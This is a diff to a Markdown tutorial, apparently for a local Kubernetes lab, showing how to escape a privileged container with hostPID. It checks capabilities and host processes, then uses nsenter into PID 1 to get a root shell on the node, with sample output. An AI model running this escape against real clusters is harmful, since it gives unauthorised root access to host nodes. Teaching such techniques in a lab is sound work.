@@ -37,15 +37,20 @@ Check your capabilities. In a normal container, this list is short. In a privile
 capsh --print
 ```
 
-If you see `Current: = cap_chown,cap_dac_override,...` (basically everything), you are privileged.
+If you see `Current: = cap_chown,cap_dac_override,...` (basically everything), you are privileged. (Note: `capsh` might not be installed in all images, but `ps` usually is).
 
 Also, check if you can see host processes (due to `hostPID: true`):
 
 ```bash
-ps aux | head
+ps aux | grep kube
 ```
 
-If you see processes like `kubelet`, `containerd`, or systemd (PID 1), you are seeing the **Node's** process tree.
+**Output:**
+```
+root         575  ... kube-apiserver --advertise-address=172.18.0.2 ...
+```
+
+If you see processes like `kube-apiserver`, `kubelet`, or `containerd`, you are seeing the **Node's** process tree.
 
 ### 3.2. The Escape Technique: nsenter
 
@@ -58,6 +63,18 @@ nsenter --target 1 --mount --uts --ipc --net --pid -- bash
 ```
 
 **Boom!** 💥
+
+Check where you are:
+
+```bash
+hostname
+# Output: battleground-control-plane (The Node's name!)
+
+cat /etc/os-release
+# Output: Debian GNU/Linux 12 (bookworm) (The Node's OS!)
+```
+
+Run `ls /` and you will see the host's filesystem. You are now `root` on the Kubernetes Node.
 
 Run `hostname`, `ls /`, or `whoami`. You are now `root` on the Kubernetes Node.
 
